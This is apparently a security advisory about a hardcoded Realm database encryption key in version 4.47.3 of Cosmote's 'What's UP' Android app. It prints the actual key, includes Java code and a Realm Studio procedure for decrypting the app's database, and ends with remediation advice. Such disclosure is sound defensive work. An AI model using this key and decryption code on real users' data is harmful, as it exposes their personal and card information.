# [Hardcoded Realm Database Encryption Key] found in What's UP Android App 4.47.3 - (RealmDB.java)

Affected Project: **WHAT'S UP 4.47.3**

Platform: Android

Vendor: Cosmote Greece

Official Application Link: (https://play.google.com/store/apps/details?id=gr.cosmote.whatsup)

Version: 4.47.3

Updated: Oct 10, 2024

<br />

> Installs: 5,000,000+

> Category: Tools

> Android Version Code: 2410115

> File Name: gr.cosmote.whatsup.apk

> Size: 20.06MB

> SHA256: 56fcd6278c70af76b342bd3374b5322d0531a5fe6db8a4dffdcd8002ade59d51

<br /> 


## Description:
The application embeds a hardcoded encryption key `(defaultRealmKey)` within the source code file `gr/desquared/kmmsharedmodule/db/RealmDB.java`. This key is used to encrypt the Realm database file named `defaultKMMV4.realm.enc`. Because the encryption key is hardcoded and packaged inside the APK, an attacker can extract it from the APK file. This exposure enables the attacker to decrypt the database file, leading to unauthorized access to confidential user information, including sensitive personal data and credit card details.


<br /> 

## Root cause:

Vulnerability found at: **RealmDB.java**

Path: gr/desquared/kmmsharedmodule/db/RealmDB.java

<br />  

## Vulnerability Analysis:

Tool for decompiling the simple architect .apk or bundle file: [Jadx](https://github.com/skylot/jadx)

The RealmDB class in RealmDB.java is responsible for managing the encrypted Realm database within the mobile application: 

```
public final class RealmDB {
    public static final String ENCRYPTED_REALM = "ENCRYPTED_REALM";
    public static final RealmDB INSTANCE = new RealmDB();
    private static final String databaseName = "defaultKMMV4";
    private static final String defaultRealmKey = "1234567812345678123456781234567812345678123456781234567812345678";
    private static final String encryptedRealmFileName = "defaultKMMV4.realm.enc";
    private static final long encryptedRealmVersion = 80;
```

Within this class there is a hardcoded encryption key used for securing the database:

```
private static final String defaultRealmKey = "1234567812345678123456781234567812345678123456781234567812345678";
```

The encryption key can be used to decrypt the application Realm database !

<br />

## Impact

1. Predictable Key: A hardcoded encryption key, especially one that is the same across all installations of the application, is inherently insecure. Attackers who decompile the application can easily extract this key.

2. Ease of Decryption: With access to the encryption key, an attacker can decrypt the database contents if they gain access to the device or a backup of the application's data, compromising sensitive user information.

3. Regulatory Non-Compliance: As the application stores personal data and credit cards info, the use of weak encryption practices may violate data protection regulations like GDPR, HIPAA, etc.


<br />

## Decryption sample code

The defaultRealmKey string is converted into a byte array before being used.

Convert the Encryption Key:

```
// Java example
String defaultRealmKey = "1234567812345678123456781234567812345678123456781234567812345678";
byte[] keyBytes = defaultRealmKey.getBytes(StandardCharsets.UTF_8);
```


Configure Realm with the Encryption Key:

```
// Java example
RealmConfiguration config = new RealmConfiguration.Builder()
    .name("defaultKMMV4.realm.enc")
    .encryptionKey(keyBytes)
    .schemaVersion(80)
    .build();
```


Open the Encrypted Realm:

```
// Java example
Realm realm = Realm.getInstance(config);
```


Access and Export Data:

```
// Java example
RealmResults<YourRealmObject> results = realm.where(YourRealmObject.class).findAll();
```


<br />

## Alternative decryption method: Using Realm Studio

Convert the Key to Hexadecimal Format as Realm Studio requires the encryption key in hexadecimal format:

```
// Java code
String defaultRealmKey = "1234567812345678123456781234567812345678123456781234567812345678";
byte[] keyBytes = defaultRealmKey.getBytes(StandardCharsets.UTF_8);

// Convert byte array to hex string
StringBuilder hexString = new StringBuilder();
for (byte b : keyBytes) {
    String hex = String.format("%02x", b);
    hexString.append(hex);
}

String encryptionKeyHex = hexString.toString();
```


Now launch Realm Studio.
Open the encrypted Realm file (defaultKMMV4.realm.enc).

When prompted, enter the hexadecimal encryption key (encryptionKeyHex).

<br />


## Recommendations for Secure Encryption Key Management


1. **Use the Android Keystore System for Secure Key Storage**

**Benefits:**

**Hardware-backed Security:** Keys can be stored in hardware-backed keystores on devices that support it.

**Isolation:** Keys are stored outside the app's process space, making them more resistant to extraction.

<br />

2. **Generate Unique Encryption Keys per Device or User**

**Benefits:**

Using unique keys minimizes the impact if a key is compromised. It ensures that only data on a particular device or user account is at risk, not all users.


**Methods:**
**Per-Device Keys:** Generate a key during the first launch of the app and store it securely.

**Per-User Keys:** If your app has user authentication, derive the key from user-specific credentials.

<br />


3. **Use a Key Derivation Function (KDF)**

**Benefits:**

Even if the KDF parameters are known, without the original input (password/PIN), the key cannot be derived.

**Choose a Strong KDF:** For example PBKDF2.

<br />

## CWE & CVE score

CWE-312: Cleartext Storage of Sensitive Information

CVSS v3.1 Base Score: 7.8 (High)

<br />

> One Click Can Change Everything: Be Secure.
